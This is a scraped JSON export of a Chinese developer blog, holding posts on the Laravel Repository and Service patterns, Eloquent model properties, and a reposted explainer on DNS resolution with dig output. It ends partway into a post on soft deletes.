这样写逻辑会有几个问题： 将数据库逻辑写在 Controller，造成 Controller 代码臃肿难以维护。 违反了 SOLID 的单一职责原则，数据库逻辑不应该写在 Controller 中。 Controller 直接操作 Model，使得对 Controller 做单元测试困难。 比较好的方式是使用 Repository： 将 Model 依赖注入到 Repository。 将数据库逻辑写在 Repository。 将 Repository 依赖注入到 Service。 app/Repositories/UserRepostitory.php 中的内容： 1234567891011121314151617181920212223242526272829303132333435363738&lt;?phpnamespace App\\Repositories;use App\\User;/** * Class UserRepository * @package App\\Repositories */class UserRepository&#123; /** * @var User */ private $user; /** * UserRepository constructor. * @param $user */ public function __construct(User $user) &#123; $this-&gt;user = $user; &#125; /** * @param $age * @return \\Illuminate\\Database\\Eloquent\\Collection|static[] */ public function getAgeLargerThan($age) &#123; return $this-&gt;user -&gt;where('age', '&gt;', $age) -&gt;orderBy('age') -&gt;get(); &#125;&#125; 在控制器app\\Controllers\\UserController.php 中使用依赖注入： 123456789101112131415161718192021222324252627282930313233343536&lt;?phpnamespace App\\Http\\Controllers;use App\\Repositories\\UserRepository;use Illuminate\\Http\\Request;/** * Class UserController * * @package App\\Http\\Controllers */class UserController extends Controller&#123; /** * @var \\App\\Repositories\\UserRepository */ protected $userRepository; /** * UserController constructor. * @param $userRepository */ public function __construct(UserRepository $userRepository) &#123; $this-&gt;userRepository = $userRepository; &#125; /** * @return \\Illuminate\\Database\\Eloquent\\Collection|static[] */ public function index() &#123; return $this-&gt;userRepository-&gt;getAgeLargerThan(20); &#125;&#125; 将相依的 UserRepository 依賴注入到 UserController，并从原本直接依赖 User Model 改成依赖注入的 UserRepository。 优点： 将数据库逻辑写在 Repository 里，解决了 Controller 代码臃肿的问题。 符合 SOLID 的单一职责原则：数据库逻辑写在 Repository 里，没写在 Controller 里。 符合 SOLID 的依赖反转原则：Controller 并非直接相依与 Repositroy，而是将 Repository 依赖注入进 Controller。 注意⚠️：实际上建议 Repository 仅依赖注入进 Service，而不是直接注入在 Controller。 其他问题是否该建立 Repository Interface？理论上使用依赖注入时，应该使用 Interface ，不过 Interface 目的在于更换数据库，让代码达到开放封闭的要求，但是实际上要更改 Reposiroty 的机会也不多，除非是从 MySQL 更换到 MongoDB，此时就应该建立 Repository Interface。不过由于我们使用了依赖注入，将来要从 Class 改成 Interface 也很方便，只要在 Constructor 的 type hint 改成 Interface 即可，维护成本很低，所以在此大可使用 Repository Class 即可，不一定得用Interface而造成 Over Design，等真正需要修改时，再重构 Interface 即可。 是否该使用 Query Scope?Laravel 4.2 就有 QueryScope，到后面的版本也都还保留着，它让我们可以将逻辑代码写在 Model ，解决了维护与重复使用的问题。如 app/User.php 里的代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?phpnamespace App;use Illuminate\\Notifications\\Notifiable;use Illuminate\\Foundation\\Auth\\User as Authenticatable;/** * App\\User * * @mixin \\Eloquent */class User extends Authenticatable&#123; use Notifiable; /** * The attributes that are mass assignable. * * @var array */ protected $fillable = [ 'name', 'email', 'password', ]; /** * The attributes that should be hidden for arrays. * * @var array */ protected $hidden = [ 'password', 'remember_token', ]; /** * * @param Builder $query * @param integer $age * * @return Builder */ public function scopeGetAgerLargerThan($query, $age) &#123; return $query-&gt;where('age', '&gt;', $age) -&gt;orderBy('age'); &#125;&#125; QueryScope 必须以 scope开头，第一个参数为 queryBuilder，一定要加上；第二个参数以后为自己要传入的参数。由于回传必须是一个 queryBuilder ，因此不需要加上 get()，在app/Controllers/UserController.php 中使用代码： 12345678910111213141516171819202122232425262728293031323334353637&lt;?phpnamespace App\\Http\\Controllers;use App\\Repositories\\UserRepository;use App\\User;use Illuminate\\Http\\Request;/** * Class UserController * * @package App\\Http\\Controllers */class UserController extends Controller&#123; /** * @var \\App\\Repositories\\UserRepository */ protected $userRepository; /** * UserController constructor. * @param $userRepository */ public function __construct(UserRepository $userRepository) &#123; $this-&gt;userRepository = $userRepository; &#125; /** * @return \\Illuminate\\Database\\Eloquent\\Collection|static[] */ public function index() &#123; return User::getAgerLargerThan(20)-&gt;get(); &#125;&#125; 在 Controller 中使用 QueryScope 时，不需要加上 Prefix，由于其本质是 queryBuilder，所以还要加上 get() 才能获得 Conllection 数据。 由于 QueryScope 是写在 Model，不是写在 Controller，所以基本上解决了 Controller 臃肿违反 SOLID 的单一职责原则的问题， Controller 也可以重复使用 QueryScope ，已经比直接将资料库逻辑写在 Controlelr 中好很多。不过若在中大型项目中，仍然有以下问题： Model 已经有原来的责任，若再加上 queryScope，造成 Model 过于臃肿难以维护。 若数据库逻辑很多，可能拆成多个 Repository，可是确很难拆成多个 Model。 单元测试困难，必须面临 mock Eloquent 的问题。 最后实际开发时，可以一开始 1 个 Repository 对应 1 个 Model，但是也不必太过执着于 1 个 Repository，一定要对应 1 个 Model，可将 Repository 视为逻辑上的数据库逻辑类别即可，可以横跨多个Model处理，也可以 1 个 Model 拆成多个 Repository，视情况而定。Repository 使得数据库逻辑从 Controller 或 Model 中解放，不仅更容易维护、更容易拓展、更容易重复使用，也更容易测试。 是否需要使用 Repository ？倒底该不该用Repository，对于这个问题，从未停止过讨论。我认为没有绝对的用或者不用，需要根据项目实际情况而定。 结合自己的一些项目经验，我的理解是：对于小项目而言，复杂查询并不多，直接使用ORM效率更高，前期快速开发才是关键，过早使用Repository 反而会造成过度设计; 而对于起步本身就是中大型项目，则可以考虑使用Repository 将复杂的查询和业务逻辑分开。 单一职责原则： Request 负责表单验证 Model 负责维护ORM Controller 负责获取请求参数 Service 负责处理业务逻辑 Repository 负责从数据库里取数据 这里有两个讨论很精彩：绝不 使用 Repository??、绝不 使用 Repository?","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Laravel","slug":"PHP/Laravel","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Laravel","slug":"Laravel","permalink":"https://www.0x2beace.com/tags/Laravel/"}]},{"title":"Laravel Eloquent 常用属性整理","slug":"laravel-eloquent-common-attributes-sorting","date":"2021-04-14T15:11:13.000Z","updated":"2021-04-19T00:13:27.036Z","comments":true,"path":"laravel-eloquent-common-attributes-sorting/","link":"","permalink":"https://www.0x2beace.com/laravel-eloquent-common-attributes-sorting/","excerpt":"Eloquent 提供了很多属性，通过对模型进行约定，可以实现很多很方便的功能。","text":"Eloquent 提供了很多属性，通过对模型进行约定，可以实现很多很方便的功能。 connection123456/** * 为模型指定一个连接名称 * * @var string */protected $connection = 'connection-name'; table123456/** * 为模型指定一个表名 * * @var string */ protected $table = 'users'; primaryKey123456/** * 为模型指定主键 * * @var string */ protected $primaryKey = 'user_id'; incrementingEloquent 假设主键是一个自增的整数值，这意味着默认情况下主键会自动转换为 int 类型。 如果希望使用非递增或非数字的主键则需要设置公共的 $incrementing 属性设置为 false： 123456/** * 如果使用的是非递增或者非数字的主键 * * @var bool */public $incrementing = false; keyType如果你的主键不是一个整数，你需要将模型上受保护的 $keyType 属性设置为 string： 123456/** * 自定义主键类型 * * @var string */protected $keyType = 'string'; timestamps默认情况下，Eloquent 预期你的数据表中存在created_at 和updated_at 字段，如果不想让 Eloquent 自动管理这两个列， 请将模型中的 $timestamps 属性设置为 false： 123456/** * 是否主动维护时间戳 * * @var bool */public $timestamps = false; CREATED_AT|UPDATED_AT123// 自定义存储时间戳的字段名const CREATED_AT = 'start_time';const UPDATED_AT = 'end_time'; dateFormat如果需要自定义时间戳的格式，在你的模型中设置 $dateFormat 属性。这个属性决定日期属性在数据库的存储方式，以及模型序列化为数组或者 JSON 的格式： 123456/** * 模型日期的存储格式 * * @var string */protected $dateFormat = 'U'; 不清楚 U 是什么意思的，请看 Date/Time 函数 。 attributes12345678/** * 模型属性的默认值 * * @var array */protected $attributes = [ 'delayed' =&gt; false,]; hidden123456/** * 隐藏以下字段 * * @var array */protected $hidden = ['password']; visible123456/** * 显示以下字段 * * @var array */protected $visible = ['first_name', 'last_name']; 如果说$hidden 属性是黑名单，那么$visible 就是白名单。 fillable123456/** * 可以被批量赋值的属性 * * @var string[] */protected $fillable = [\"username\"]; guarded123456/** * 设定不可被批量赋值的属性，当 $guarded 为空数组时则所有属性都可以被批量赋值。 * * @var array */protected $guarded = ['price']; castscasts 属性很有用，可以使得从数据库中获取的数据，可以自动转换成我们期望的类型。 1234567891011/** * 字段转换为对应的类型 * * @var array */protected $casts = [ \"settings\" =&gt; \"array\", 'created_at' =&gt; 'datetime:Y-m-d H:i:s', 'updated_at' =&gt; 'datetime:Y-m-d H:i:s', 'is_admin' =&gt; 'boolean',]; 可能的属性转换列类型：|类型|描述||-|-||int|integer|通过 PHP 转换（int）||real|float|double|通过 PHP 转换（float）||string|通过 PHP 转换（string）||bool|boolean|通过 PHP 转换（bool）||object|作为一个stdClass 对象，从JSON 解析或被解析为JSON||array|作为一个数组，从JSON 解析或被解析为JSON||collection|作为一个集合，从JSON 解析或被解析为JSON||date|datetime|从数据库DATATIME 解析为Carbon 类型，然后返回||timestamp|数数据库TIMESTAMP 解析为Carbon 类型，然后返回| dates123456/** * 需要转换成日期的属性。 * * @var array */protected $dates = ['deleted_at']; perPage123456&#x2F;** * 默认分页数量 * * @var int *&#x2F;protected $perPage &#x3D; 50; touches123456/** * 更新关联模型的 updated_at 字段 * * @var array */protected $touches = ['post']; dispatchesEvents123456789/** * 模型的事件映射 * * @var array */protected $dispatchesEvents = [ 'saved' =&gt; UserSaved::class, 'deleted' =&gt; UserDeleted::class,]; with为关联模型默认添加『渴求式加载』，等效于使用查询构造器时，手动指定with。 123456789101112131415class User &#123; /** * * * @var string[] */ protected $with = [ \"topics\", ]; public function topics() &#123; return $this-&gt;hasMany(Topic::class); &#125;&#125; 参考链接 Eloquent ORM 快速入门","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Laravel","slug":"PHP/Laravel","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Laravel","slug":"Laravel","permalink":"https://www.0x2beace.com/tags/Laravel/"}]},{"title":"『转载』如何使用Service 模式","slug":"how-to-use-service-mode","date":"2021-04-12T15:22:55.000Z","updated":"2021-04-12T15:23:55.459Z","comments":true,"path":"how-to-use-service-mode/","link":"","permalink":"https://www.0x2beace.com/how-to-use-service-mode/","excerpt":"若将数据库逻辑都写在 Controller 里，会造成 Controller 代码的臃肿难以维护，基于 SOLID 原则，我们应该使用 Service 模式辅助 Controller，将相关的业务逻辑封装在不同的 Service，方便项目的后期维护。","text":"若将数据库逻辑都写在 Controller 里，会造成 Controller 代码的臃肿难以维护，基于 SOLID 原则，我们应该使用 Service 模式辅助 Controller，将相关的业务逻辑封装在不同的 Service，方便项目的后期维护。 商业逻辑商业逻辑中，常见的如 : 牵涉到外部行为 : 如发送Email，使用外部API… 使用PHP写的逻辑 : 如根据购买的件数，有不同的折扣。 若将商业逻辑写在 controller，会造成 controller 肥大，日后难以维护。 Service牵涉到外部的行为如 发送Email，常常会在 Controller 中直接调用 Mail::queue()： 1234567891011 /** * @param \\Illuminate\\Http\\Request $request */public function store(Request $request)&#123; \\Mail::queue('email.index', $request-&gt;all(), function (Message $message) &#123; $message-&gt;sender(env('MAIL_USERNAME')); $message-&gt;subject(env('MAIL_SUBJECT')); $message-&gt;to(env('MAIL_TO_ADDR')); &#125;);&#125; 在中大型的项目中，会有几个问题： 将牵涉到外部行为的逻辑写在 Controller，造成 Controller 代码臃肿难以维护 违反 SOLID 的单一职责原则：外部行为不应该写在 Controller Controller 直接相依于外部行为，使得我们无法对 Controller 做单元测试 比较好的方式是使用 Service，使用的步骤如下： 将外部行为注入到 Service 在 Service 使用外部行为 将 Service 注入到 Controlelr app\\Services\\EmailService.php： 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpnamespace App\\Services;use Illuminate\\Mail\\Message;use Mail;/** * Class EmailService * * @package App\\Services */class EmailService&#123; /** * @var \\Mail */ protected $mailer; /** * 将相依的 Mailer 注入到 EmailService * EmailService constructor. * * @param $mailer */ public function __construct(Mail $mailer) &#123; $this-&gt;mailer = $mailer; &#125; /** * 发送 Email的逻辑写在 send() 不是使用 Mail Facade，而是使用 $this-&gt;mailer * @param array $request */ public function send(array $request) &#123; $this-&gt;mailer-&gt;queue('email.index',$request,function(Message $message)&#123; $message-&gt;sender(env('MAIL_USERNAME')); $message-&gt;subject(env('MAIL_SUBJECT')); $message-&gt;to(env('MAIL_TO_ADDR')); &#125;); &#125;&#125; app\\Controllers\\UserController.php： 12345678910111213141516171819202122232425262728&lt;?phpnamespace App\\Http\\Controllers;use App\\Services\\EmailService;use Illuminate\\Http\\Request;/** * Class UserController * * @package App\\Http\\Controllers */class UserController extends Controller&#123; /** * @var \\App\\Services\\EmailService */ protected $emailService; /** * @param \\Illuminate\\Http\\Request $request */ public function store(Request $request) &#123; $this-&gt;emailService-&gt;send($request-&gt;all()); &#125;&#125; 从原本相依于 Mail Facade ，改成相依于注入的 EmailService。改用这种写法有几个优点，如下： 将外部行为写在 Service，解决了 Controller 代码臃肿的问题。 符合 SOLID 的单一职责原则： 外部行为写在 Service ，没写在 Controller。 符合 SOLID 的依赖反转原则：Controller 并非直接相依于 Service，而是将 Service 依赖注入进 Controller。 使用 PHP 写的逻辑如根据用户购买数量，给予同步的折扣，可能我们会在 Controller 直接写 if () { ... } else { ... } 逻辑。 app\\Controllers\\UserController.php： 123456789101112131415161718public function index(Request $request)&#123; $number = $request-&gt;input('number'); $price = 500; $discount = 1; if ($number == 1) &#123; $discount = 1; &#125; elseif ($number == 2) &#123; $discount = 0.9; &#125; elseif ($number == 3) &#123; $discount = 0.8; &#125; else &#123; $discount = 0.7; &#125; $total = $price * $number * $discount; return $total;&#125; 在中大型项目中，会有几个问题： 将 PHP 写的业务逻辑直接写在 Controller ，造成 Controller 的代码臃肿难以维护 违反了 SOLID 的单一职责原则：业务逻辑不应该写在 Controller 违反了 SOLID 的单一职责原则：若未来想要改变折扣的写算法，都需要用到此 Method，也也就是说这个 Method 同时包含了计算折扣于计算加总的职责，因此违反了 SOLID 的单一职责原则 直接写在 Controller 的逻辑无法被其他 Controller 使用 app\\Services\\OrderService.php： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;?phpnamespace App\\Services;/** * Class OrderService * * @package App\\Services */class OrderService&#123; /** * 计算折扣 * * @param $number * * @return float */ public function getDisCount($number) &#123; switch ($number) &#123; case 1: return 1.0; break; case 2: return 0.9; break; case 3: return 0.8; break; default: return 0.7; &#125; &#125; /** * 计算最后价格 * * @param $number * @param $discount * * @return int */ public function getTotal($number, $discount) &#123; return 500 * $number * $discount; &#125;&#125; 在 Controller 中调用代码，如下： 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpnamespace App\\Http\\Controllers;use App\\Services\\OrderService;use Illuminate\\Http\\Request;/** * Class UserController * * @package App\\Http\\Controllers */class UserController extends Controller&#123; /** * @var \\App\\Services\\EmailService */ protected $orderService; /** * UserController constructor. * * @param \\App\\Services\\OrderService $orderService */ public function __construct(OrderService $orderService) &#123; $this-&gt;orderService = $orderService; &#125; /** * @param \\Illuminate\\Http\\Request $request * * @return int */ public function index(Request $request) &#123; $number = $request-&gt;input('number'); $discount = $this-&gt;orderService-&gt;getDisCount($number); return $this-&gt;orderService-&gt;getTotal($number, $discount); &#125;&#125; 将原本的 if () { .. } else { .. } 逻辑改写成使用 OrderService，Controller 变得非常干净，也达成原来 Controller接受 Http Request，调用其他 Class 的责任。 改用这种写法的几个优点： 将 PHP 写的业务逻辑写在 Service ，解决了 Controller 代码臃肿的问题 符合 SOLID 的单一职责原则： 业务逻辑写在 Service，没写在 Controller 符合 SOLID 的单一职责原则：计算折扣与计算加总分开在不同的 Method，且归属于 OrderService，而非 Controller 符合 SOLID 的依赖反转原则： Controller 并非直接相依于 Service，而是将 Service 依赖注入进 Controller 其他 Controller 也可以重复使用这段业务逻辑 总结 实际上会有很多 Service ，需要自行依照 SOLID 原则去判断是否该建立 Service Service 使得业务逻辑从 Controller 中解放，不仅更容易维护、更容易拓展、更容易重复使用且更容易测试 原文链接 如何使用Service？ 如何使用 Service 模式? 项目地址","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Laravel","slug":"PHP/Laravel","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Laravel","slug":"Laravel","permalink":"https://www.0x2beace.com/tags/Laravel/"}]},{"title":"『转载』域名背后那些事","slug":"those-things-behind-the-domain-name","date":"2021-04-11T07:14:30.000Z","updated":"2021-04-11T07:16:33.330Z","comments":true,"path":"those-things-behind-the-domain-name/","link":"","permalink":"https://www.0x2beace.com/those-things-behind-the-domain-name/","excerpt":"互联网中的地址是数字的 IP 地址，例如61.135.169.125就是百度的官网地址之一，如果每次访问百度都需要输入 IP 的话，估计到今天互联网都还没有走出鸿蒙阶段。","text":"互联网中的地址是数字的 IP 地址，例如61.135.169.125就是百度的官网地址之一，如果每次访问百度都需要输入 IP 的话，估计到今天互联网都还没有走出鸿蒙阶段。 在网络发展历史上，最开始确实就是直接使用 IP 地址来访问远程主机的。早期联网的每台计算机都是采用主机文件（即我们俗称的 hosts 文件）来进行地址配置和解析的，后来联网机器越来越多，主机文件的更新和同步就成了很大的问题。于是，1983 年保罗·莫卡派乔斯发明了域名解析服务和域名系统，在 1985 年 1 月 1 日，世界上第一个域名 nordu.net 才被注册成功。 域名比 IP 地址更容易记忆，本质上只是为数字化的互联网资源提供了易于记忆的别名，就像在北京提起「故宫博物院」就都知道指的是「东城区景山前街 4 号」的那个大院子一样。如果把 IP 地址看成电话号码，那域名系统就是通讯录。我们在通讯录里保存了朋友和家人的信息，每次通过名字找到某人打电话的时候，通讯录就会查出与之关联的电话号码，然后拨号过去。我们可能记不下多少完整的电话号码，但是联系人的名字却是一定记得的。 既然「域名」只是一个别名，单凭这一个名字我们并不能访问到正确的地址，只有能将域名解析成实际的网络地址，网络访问才能成功。这种解析工作由专门的「域名系统」（Domain Name System，简称 DNS）完成，DNS 也是互联网的核心基础服务之一。 域名解析是怎么完成的DNS 解析的过程是什么样子的呢？在开始这个问题之前，我们先看一看域名的层次结构。 域名的层级结构在讨论域名的时候，我们经常听到有人说「顶级域名」、「一级域名」、「二级域名」等概念，域名级别究竟是怎么划分的呢？ 根域名。还是以百度为例，通过一些域名解析工具，我们可以看到百度官网域名显示为 www.baidu.com.，细心的人会注意到，这里最后有一个 .，这不是 bug，而是所有域名的尾部都有一个根域名。www.baidu.com 真正的域名是 www.baidu.com.root，简写为www.baidu.com.，又因为根域名 .root对于所有域名都是一样的，所以平时是省略的，最终就变成了我们常见的样子。 根域名的下一级叫做顶级域名（top-level domain，缩写为 TLD），也叫做一级域名，常见的如 .com/、.net/、.org/、.cn/ 等等，他们就是顶级域名。 再下一级叫做二级域名（second-level domain，缩写为 SLD），比如 baidu.com。这是我们能够购买和注册的最高级域名。次级域名之下，就是主机名（host），也可以称为三级域名，比如 www.baidu.com，由此往下，基本上 N 级域名就是在 N-1 级域名前追加一级。 总结一下，常见的域名层级结构如下： 12主机名.次级域名.顶级域名.根域名www.baidu.com.root 一般来说我们购买一个域名就是购买一个二级域名（SLD）的管理权（如 0x2beace.com），有了这个管理权我们就可以随意设置三级、四级域名了。 域名解析的过程与域名的分级结构对应，DNS 系统也是一个树状结构，不同级别的域名由不同的域名服务器来解析，整个过程是一个「层级式」的。 层级式域名解析体系的第一层就是根域名服务器，全世界 IPv4 根域名服务器只有 13 台（名字分别为 A 至 M），1 个为主根服务器在美国，其余 12 个均为辅根服务器，它们负责管理世界各国的域名信息。在根服务器下面是顶级域名服务器，即相关国家域名管理机构的数据库，如中国互联网络信息中心（CNNIC）。然后是再下一级的权威域名服务器和 ISP 的缓存服务器。 一个域名必须首先经过根数据库的解析后，才能转到顶级域名服务器进行解析，这一点与生活中问路的情形有几分相似。 假设北京市设立了一个专门的「道路咨询局」，里面设置了局长、部长、处长、科员好几个级别的公务员，不同的部门、科室、人员负责解答不同区域的道路问题。这里的人都有一个共同特点，信奉「好记性不如烂笔头」的哲理，喜欢将自己了解到的信息记录到笔记本上。但是有一点遗憾的是，他们写字用的墨水只有一种，叫「魔术墨水」，初写字迹浓厚，之后会慢慢变淡，1 小时之后则会完全消失。道路咨询局门口还有一个门卫大爷，所有的人要问路都需要通过他来传达和回复，市民并不能进入办公楼。 如果市民 A 先生来找门卫大爷询问「北海公园」的地址，门卫大爷会先看一下自己的笔记本，找找看之前有没有人问过北海公园，如果没有，他就会拨打内线去找局长求助。局长说北海是西城区，你去问负责西城区道路信息的赵部长吧。门卫大爷又去问赵部长，赵部长查了一下，说这个地址你去问负责核心区的钱处长吧。门卫大爷又给钱处长打过去电话，钱处长说这个地址我也不掌握啊，你去问一下负责景山片区的科员小孙吧。门卫大爷从小孙那里终于知道了北海公园地址，他赶紧记到自己的小本本上，然后把结果告诉了市民 A 先生。接下来一小时内，如果还有市民 B 先生再来问北海公园的话，门卫大爷就直接用笔记本上记载的结果回复了。当然，如果市民 C 女士过来问别的地址的话，门卫大爷就要把处理 A 先生问询的流程再走一遍了。 分级查询的实例现在我们来看一个实际的例子。如果我们在浏览器中输入https://news.qq.com，那浏览器会从接收到的 URL 中抽取出域名字段（news.qq.com），然后将它传给 DNS 客户端（操作系统提供）来解析。 首先我们说明一下本机 DNS 配置（就是 /etc/resolv.conf 文件，里面指定了本地 DNS 服务器的地址，Windows 系统可能会有所不同）： 123$ cat /etc/resolv.conf nameserver 202.106.0.20nameserver 202.106.196.115 然后我们用 dig 这个工具查看一下 news.qq.com 的解析结果（其中中文部分是解释说明）： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748$ dig news.qq.com; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; news.qq.com这是 dig 程序的版本号与要查询的域名;; global options: +cmd;; Got answer:以下是要获取的内容。;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 47559;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 0这个是返回应答的头部信息：1. opcode：操作码，QUERY 代表查询操作；2. status: 状态，NOERROR 代表没有错误;3. id：编号，在 DNS 协议中通过编号匹配返回和查询；4. flags: 标志，含义如下: - qr：query，查询标志，代表是查询操作 - rd：recursion desired，代表希望进行递归查询操作; - ra：recursive available，代表查询的服务器支持递归查询操作;5. QUERY 查询数，与下面 QUESTION SECTION 的记录数一一对应；6. ANSWER 结果数，与下面的 ANSWER SECTION 的记录数一一对应；7. AUTHORITY 权威回复数，如果查询结果由管理域名的域名服务器而不是缓存服务器提供的，则称为权威回复。 0 表示所有结果都不是权威回复；8. ADDITIONAL 额外记录数；;; QUESTION SECTION:;news.qq.com. IN A查询部分,从左到右部分意义如下:1、要查询的域名；2、要查询信息的类别，IN 代表类别为 IP 协议，即 Internet。3、查询的记录类型，A 记录(Address)代表要查询 IPv4 地址。;; ANSWER SECTION:news.qq.com. 136 IN CNAME https.qq.com.https.qq.com. 476 IN A 125.39.52.26回应部分，从左到右各部分意义：1、对应的域名2、TTL，time to live，缓存时间，单位秒，代表缓存域名服务器可以在缓存中保存的期限。3、查询信息的类别4、查询的记录类型，CNAME 表示别名记录，A 记录(Address)代表 IPv4 地址。5、域名对应的 ip 地址。;; Query time: 56 msec;; SERVER: 202.106.0.20#53(202.106.0.20)查询使用的服务器地址和端口,其实就是本地 DNS 域名服务器;; WHEN: Thu Jul 11 15:59:37 CST 2019;; MSG SIZE rcvd: 65查询的时间与回应的大小，收到 65 字节的应答数据。 从这个应答可以看到，我们得到的结果不是权威回复，只是本地 DNS 服务器从缓存中给了应答。 接下来我们在 dig 命令中增加一个参数 +trace，看看完整的分级查询过程： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556$ dig +trace news.qq.com; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; +trace news.qq.com;; global options: +cmd. 432944 IN NS g.root-servers.net.. 432944 IN NS k.root-servers.net.. 432944 IN NS b.root-servers.net.. 432944 IN NS h.root-servers.net.. 432944 IN NS i.root-servers.net.. 432944 IN NS f.root-servers.net.. 432944 IN NS d.root-servers.net.. 432944 IN NS e.root-servers.net.. 432944 IN NS j.root-servers.net.. 432944 IN NS l.root-servers.net.. 432944 IN NS c.root-servers.net.. 432944 IN NS m.root-servers.net.. 432944 IN NS a.root-servers.net.;; Received 228 bytes from 202.106.0.20#53(202.106.0.20) in 45 ms这些就是神秘的根域名服务器，由本地 DNS 服务器返回了所有根域名服务器地址。com. 172800 IN NS g.gtld-servers.net.com. 172800 IN NS a.gtld-servers.net.com. 172800 IN NS b.gtld-servers.net.com. 172800 IN NS m.gtld-servers.net.com. 172800 IN NS d.gtld-servers.net.com. 172800 IN NS c.gtld-servers.net.com. 172800 IN NS j.gtld-servers.net.com. 172800 IN NS h.gtld-servers.net.com. 172800 IN NS f.gtld-servers.net.com. 172800 IN NS l.gtld-servers.net.com. 172800 IN NS e.gtld-servers.net.com. 172800 IN NS k.gtld-servers.net.com. 172800 IN NS i.gtld-servers.net.;; Received 1171 bytes from 192.36.148.17#53(i.root-servers.net) in 57 ms这里显示的是 .com 域名的 13 条 NS 记录，本地 DNS 服务器向这些顶级域名服务器发出查询请求，询问 qq.com 的 NS 记录。qq.com. 172800 IN NS ns1.qq.com.qq.com. 172800 IN NS ns2.qq.com.qq.com. 172800 IN NS ns3.qq.com.qq.com. 172800 IN NS ns4.qq.com.;; Received 805 bytes from 192.48.79.30#53(j.gtld-servers.net) in 331 ms这里显示的是 qq.com 的 4 条 NS 记录，由 j.gtld-servers.net 这台服务器最先返回。然后本地 DNS 服务器向这四台服务器查询下一级域名 news.qq.com 的 NS 记录。news.qq.com. 86400 IN NS ns-cnc1.qq.com.news.qq.com. 86400 IN NS ns-cnc2.qq.com.;; Received 180 bytes from 58.144.154.100#53(ns4.qq.com) in 37 ms这里显示的是 news.qq.com 的 NS 记录，它们是由上面的 ns4.qq.com 域名服务器返回的。然后本地 DNS 服务器向这两台机器查询 news.qq.com 的主机名。news.qq.com. 600 IN CNAME https.qq.com.https.qq.com. 600 IN A 125.39.52.26;; Received 76 bytes from 223.167.83.104#53(ns-cnc2.qq.com) in 29 ms这是上面的 ns-cnc2.qq.com 返回的最终查询结果：news.qq.com 是 https.qq.com 的别名，而 https.qq.com 的 A 记录地址是 125.39.52.26 实际的流程里面，本地 DNS 服务器相当于门卫大爷，根域名服务器相当于局长同志，其余以此类推。客户端与本地 DNS 服务器之间的查询叫递归查询，本地 DNS 服务器与其他域名服务器之间的查询就叫迭代查询。 域名记录的类型域名服务器之所以能知道域名与 IP 地址的映射信息，是因为我们在域名服务商那里提交了域名记录。购买了一个域名之后，我们需要在域名服务商那里设置域名解析的记录，域名服务商把这些记录推送到权威域名服务器，这样我们的域名才能正式生效。 在设置域名记录的时候，会遇到「A 记录」、「CNAME」 等不同类型，这正是前面做域名解析的时候我们碰到的结果。这些类型是什么意思，它们之间有什么区别呢？接下来我们看看常见的记录类型。 A 记录。A (Address) 记录用来直接指定主机名（或域名）对应的 IP 地址。主机名就是域名前缀，常见有如下几种： www：解析后的域名为 www.0x2beace.com，一般用于网站地址。 @：直接解析主域名。 *：泛解析，指将 *.yourdomain.com 解析到同一 IP。 CNAME 记录。CNAME 的全称是 Canonical Name，通常称别名记录。如果需要将域名指向另一个域名，再由另一个域名提供 IP 地址，就需要添加 CNAME 记录。 MX 记录。邮件交换记录，用于将以该域名为结尾的电子邮件指向对应的邮件服务器以进行处理。 NS 记录。域名服务器记录，如果需要把子域名交给其他 DNS 服务器解析，就需要添加 NS 记录。 AAAA 记录。用来指定主机名（或域名）对应的 IPv6 地址，不常用。 TXT 记录。可以填写任何东西，长度限制 255。绝大多数的 TXT 记录是用来做 SPF 记录（反垃圾邮件），MX 记录的作用是给寄信者指明某个域名的邮件服务器有哪些。SPF 的作用跟 MX 相反，它向收信者表明，哪些邮件服务器是经过某个域名认可会发送邮件的。 显性 URL。从一个地址 301 重定向（也叫「永久性转移」）到另一个地址的时候，就需要添加显性 URL 记录。 隐性 URL。从一个地址 302 跳转（也叫「临时跳转」）到另一个地址，需要添加隐性 URL 记录。它类似于显性 URL，区别在于隐性 URL 不会改变地址栏中的域名。 在填写各种记录的时候，我们还会碰到一个特殊的设置项——TTL，生存时间（Time To Live）。 TTL表示解析记录在 DNS 服务器中的缓存时间，时间长度单位是秒，一般为3600秒。比如：在访问news.qq.com 时，如果在 DNS 服务器的缓存中没有该记录，就会向某个 NS 服务器发出请求，获得该记录后，该记录会在 DNS 服务器上保存TTL的时间长度，在TTL有效期内访问 news.qq.com，DNS 服务器会直接缓存中返回刚才的记录。 原文链接 域名背后那些事","categories":[],"tags":[{"name":"域名","slug":"域名","permalink":"https://www.0x2beace.com/tags/%E5%9F%9F%E5%90%8D/"}]},{"title":"如何更好的使用 Laravel 软删除","slug":"how-to-better-use-laravel-soft-delete","date":"2021-04-10T12:26:01.000Z","updated":"2021-04-10T12:27:07.466Z","comments":true,"path":"how-to-better-use-laravel-soft-delete/","link":"","permalink":"https://www.0x2beace.com/how-to-better-use-laravel-soft-delete/","excerpt":"通常对于数据库中比较重要的数据，不会直接删除，而是采用软删除。","text":"通常对于数据库中比较重要的数据，不会直接删除，而是采用软删除。 Laravel 的Eloquent 也提供相应的功能达到软删除模型的目的，不过个人觉得Laravel 的软删除存在一些问题： 